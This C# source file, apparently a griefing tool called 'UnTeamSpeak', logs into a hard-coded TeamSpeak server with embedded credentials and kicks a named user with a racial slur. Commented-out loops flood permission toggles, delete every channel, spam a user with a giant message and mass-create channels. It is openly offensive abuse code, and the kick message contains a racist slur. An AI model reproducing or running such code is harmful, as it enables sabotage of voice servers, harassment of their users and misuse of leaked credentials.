/* UnTeamSpeak
 * by [g00n]JaGx (g00ns.net)
 */
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace UnTeamSpeak
{
    class UnTeamSpeakMain
    {
        static void Main(string[] args)
        {
            TeamSpeak ts = new TeamSpeak("205.209.164.88", 8767);
            ts.login("UnTeamSpeak", "BlackHat", 0x0007002100210001, true, true, "jewCipher", "cxaai51955kiqd8h", "KEEBLER");
            ts.kickPlayer(ts.getPlayerByNick("static").id, "YOU NIGGA!");
            
            /*uint id = ts.getPlayerByNick("Aweeo").id;
            for (; ; )
            {
                Thread.Sleep(1);
                ts.grantVoice(id);
                ts.grantChannelAdmin(id);
                Thread.Sleep(1);
                ts.revokeVoice(id);
                ts.revokeChannelAdmin(id);
            }*/
            /*IEnumerator enumerator = ts.channels.GetEnumerator();
            while (enumerator.MoveNext())
            {
                Channel channel = (Channel) enumerator.Current;
                ts.deleteChannel(channel.id);
                Thread.Sleep(1);
            }*/
            /*for (; ; )
            {
                Thread.Sleep(1);
                ts.sendMessageToPlayer(id, "www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.www.");
            }*/
            /*for (uint i = 0; ; i++)
            {
                Thread.Sleep(1);
                ts.createChannel("g00ns.net|" + i, "", "", 0, "", 0, 0, true, false, false, false);
            }*/
        }
    }
}
